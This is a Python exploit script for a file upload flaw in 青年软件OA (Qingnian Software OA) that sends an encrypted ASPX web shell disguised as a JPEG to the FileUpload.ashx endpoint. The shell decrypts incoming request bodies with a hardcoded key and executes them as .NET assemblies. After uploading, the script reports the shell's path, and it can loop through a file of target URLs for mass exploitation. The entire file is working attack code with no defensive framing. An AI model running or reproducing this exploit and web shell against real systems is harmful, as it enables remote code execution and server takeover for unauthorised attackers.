import argparse
import base64
import json
import subprocess
import requests
import jsonpath
def Args():
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter,description='''
青年软件OA upload
    ''')
    parser.add_argument('-u','--url',help="please input URL")
    parser.add_argument('-f','--file',help="please input URL file")
    args = parser.parse_args()
    if args.file is None and args.url is None:
        print(parser.print_help())
        exit()
    else:
        return args
def attack(url):
    realurl = url + "/Controls/Ajax/WebUpload/FileUpload.ashx"
    files = {
        'guid':'wu_1fm994sub12b4bvd1nb81bj31pvu0',
        'id':'WU_FILE_0',
        'name':'joker.aspx',
        'type':'image/jpeg',
        'lastModifiedDate':'Wed Oct 13 2021 17:11:10',
        'size':'71594',
        'file':("joker.aspx",'''<%@ Page Language="C#" %><%@Import Namespace="System.Reflection"%><%Session.Add("k","e45e329feb5d925b");byte[] k = Encoding.Default.GetBytes(Session[0] + ""),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this);%>''',
        "image/jpeg")
    }
    try:
        res = requests.post(url=realurl,files=files)
        if '\"success\":true' in res.text:
            res2 = json.loads(res.text)
            filepath = jsonpath.jsonpath(res2[0],expr='$.FilePath')[0]
            print("upload success！shellpath："+url+filepath+'.aspx')
        else:
            print("vuln is not exists")
    except Exception as e:
             print('vuln is not exists')
def readfile(urlpath):
    list = []
    with open(urlpath,"r") as f:
        line = f.readlines()
    for i in line:
        if '/' == i.strip()[:-1]:
            i = i.strip()
        else:
            i = i.strip()+'/'
        list.append(i)
    return list

def main():
    args = Args()
    if args.file is None and args.url is not None:
        attack(args.url)
    else:
        urllist = readfile(args.file)
        for i in urllist:
            attack(i)
if __name__ =="__main__":
    main()
